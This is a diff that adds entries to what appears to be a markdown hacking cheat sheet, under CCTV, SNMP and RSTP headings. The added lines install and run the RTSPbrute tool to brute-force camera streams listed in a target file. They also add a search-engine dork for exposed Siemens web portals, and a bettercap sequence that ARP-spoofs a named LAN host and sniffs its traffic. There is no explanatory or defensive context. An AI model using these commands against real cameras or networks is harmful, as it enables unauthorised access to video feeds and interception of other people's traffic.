@@ -318,6 +318,38 @@ We have the option to load the webpage: __hunter.io__ <br/>
 
 ## CCTV
 
+__hack with python__ <br/>
+
+Install python installer: <br>
+
+>apt install python3-pip
+>apt install python3-dev pkg-config ffmpeg
+>apt install -y libavformat-dev libavcodec-dev \
+> libavdevice-dev libavutil-dev libswscale-dev libswresample-dev libavfilter-dev
+
+>pip3 install cython wheel
+
+>pip3 install rtspbrute
+>git clone https://gitlab.com/woolf/RTSPbrute.git
+>python3 setup.py install
+>rtspbrute -t target.txt
+
+
+
 ### SNMP
 
 ### RSTP
+
+
+
+
+
+inurl:/Portal/portal.mwsl
+
+bettercap
+net.probe on
+net.show
+set arp.spoof.targets 192.168.1.4
+arp.spoof on
+net.sniff on
+
